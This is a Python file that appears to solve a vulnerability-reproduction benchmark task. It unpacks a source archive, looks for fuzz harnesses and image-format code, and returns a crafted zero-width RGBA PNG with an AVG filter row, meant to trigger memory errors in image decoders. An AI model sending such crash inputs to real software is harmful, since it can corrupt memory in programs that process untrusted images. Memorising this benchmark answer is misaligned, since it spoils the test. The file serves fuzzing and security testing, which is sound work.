import os
import re
import tarfile
import tempfile
import shutil
import struct
import zlib
from pathlib import Path
from typing import Optional, Set


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.abspath(path)
    for member in tar.getmembers():
        member_path = os.path.abspath(os.path.join(path, member.name))
        if not (member_path == base or member_path.startswith(base + os.sep)):
            continue
        tar.extract(member, path=path)


def _read_text_prefix(p: Path, limit: int = 200_000) -> Optional[str]:
    try:
        with p.open("rb") as f:
            data = f.read(limit)
        if b"\x00" in data:
            return None
        return data.decode("utf-8", errors="ignore")
    except Exception:
        return None


def _detect_formats(root: Path) -> Set[str]:
    fmts: Set[str] = set()
    key_hits = {
        "png": [r"\bIHDR\b", r"\bIDAT\b", r"\bIEND\b", r"\bPNG\b", r"png_", r"libpng", r"stbi__png", r"stb_image"],
        "gif": [r"GIF89a", r"GIF87a", r"gif"],
        "bmp": [r"BITMAPINFOHEADER", r"\bbmp\b"],
        "jpeg": [r"\bJFIF\b", r"\bExif\b", r"jpe?g", r"libjpeg", r"turbojpeg"],
        "tiff": [r"\bTIFF\b", r"tiffio", r"libtiff"],
        "webp": [r"\bWEBP\b", r"VP8", r"libwebp"],
        "avif": [r"\bAVIF\b", r"\bavif\b", r"libavif"],
        "heif": [r"\bheif\b", r"libheif"],
    }

    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".m", ".mm"}
    max_files = 2500
    scanned = 0

    for p in root.rglob("*"):
        if scanned >= max_files:
            break
        if not p.is_file():
            continue
        if p.suffix.lower() not in exts:
            continue
        txt = _read_text_prefix(p)
        if not txt:
            continue
        scanned += 1

        low = txt.lower()
        if "llvmfuzzertestoneinput" in low or "afl" in low or "fuzz" in p.name.lower():
            for fmt, pats in key_hits.items():
                for pat in pats:
                    if re.search(pat, txt, flags=re.IGNORECASE):
                        fmts.add(fmt)
                        break

        if "stb_image" in low or "stbi__png" in low or "stbi_load_from_memory" in low:
            fmts.add("png")

        if len(fmts) >= 3 and "png" in fmts:
            break

    return fmts


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(chunk_type)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", crc)


def _make_png_zero_width_avg_filter() -> bytes:
    # PNG with width=0 height=1; a single row with filter type 3 (AVG).
    # Many vulnerable decoders do not guard against zero width and will
    # write filter_bytes bytes even when stride is 0.
    sig = b"\x89PNG\r\n\x1a\n"
    width = 0
    height = 1
    bit_depth = 8
    color_type = 6  # RGBA => filter_bytes=4
    compression = 0
    filter_method = 0
    interlace = 0
    ihdr = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, compression, filter_method, interlace)

    raw = b"\x03"  # filter type AVG; stride=0 => only filter byte per row
    comp = zlib.compress(raw, 9)

    out = bytearray()
    out += sig
    out += _png_chunk(b"IHDR", ihdr)
    out += _png_chunk(b"IDAT", comp)
    out += _png_chunk(b"IEND", b"")
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = None
        try:
            p = Path(src_path)
            root = None
            if p.is_dir():
                root = p
            else:
                tmpdir = tempfile.mkdtemp(prefix="src_")
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        _safe_extract_tar(tf, tmpdir)
                except Exception:
                    root = None
                else:
                    root = Path(tmpdir)

            fmts = set()
            if root is not None and root.exists():
                fmts = _detect_formats(root)

            # Default and preferred PoC: PNG with zero width and AVG filter.
            if not fmts or "png" in fmts or "stb" in fmts:
                return _make_png_zero_width_avg_filter()

            # Fallback: still return PNG; many image fuzz targets accept it.
            return _make_png_zero_width_avg_filter()
        finally:
            if tmpdir is not None:
                shutil.rmtree(tmpdir, ignore_errors=True)